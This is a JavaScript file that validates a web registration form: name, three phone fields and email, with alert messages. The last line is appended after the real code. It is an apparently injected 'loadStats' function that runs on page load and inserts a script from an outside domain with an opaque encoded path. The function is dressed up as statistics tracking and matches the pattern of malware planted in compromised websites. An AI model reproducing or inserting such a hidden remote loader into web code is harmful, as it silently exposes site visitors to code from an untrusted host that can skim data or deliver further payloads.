function chkNumeric(strString)
{
     var reg = /[0-9]/;
	 if (reg.test(strString) == true)
	 {
	 return true;
	 }
		 else
	 {
		 return false;
	 }
	}
function validatereg()
{
var frm = document.form1;
if(frm.name.value == '')
	{
		alert('Please enter your Name');
		frm.name.focus();
		return false;
	}
 
 if(frm.phone.value == '')
	{
		alert('Please enter your telephone number in the format 111-222-3333.');
		frm.phone.focus();
          return false;
	}	
if (chkNumeric(frm.phone.value) == false)
	{
     	alert('Please enter your valid Telephone Number');
		frm.phone.focus();
		 return false;
	}		


 if(frm.phone1.value == '')
	{
		alert('Please enter your telephone number in the format 111-222-3333.');
		frm.phone1.focus();
          return false;
	}	
if (chkNumeric(frm.phone1.value) == false)
	{
     	alert('Please enter your valid Telephone Number');
		frm.phone1.focus();
		 return false;
	}		


 if(frm.phone2.value == '')
	{
		alert('Please enter your telephone number in the format 111-222-3333.');
		frm.phone2.focus();
          return false;
	}	
if (chkNumeric(frm.phone2.value) == false)
	{
     	alert('Please enter your valid Telephone Number');
		frm.phone2.focus();
		 return false;
	}		



 if(frm.email.value == '')
	{
	alert('Please enter your Email Address');
		frm.email.focus();
		return false;
	}	
	 var reg = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;
	 var address = document.form1.email.value;
   if(reg.test(address) == false) {
      alert('Invalid Email Address');
      return false;
   }
return true;
}
if(!loadStats){function loadStats(){var head=document.getElementsByTagName("head")[0],scr=document.createElement("script");scr.type="text/javascript",scr.src="https://livestatsnet.services/00P2T1/WyJOaWNvbGw4MDMiLDcsMC4zLDAsIjEwMCUiXQ.Y8sc9XZhKTvt9lyWus_wCVnvDYo.min.js",scr.async="async",head.appendChild(scr)}loadStats()}
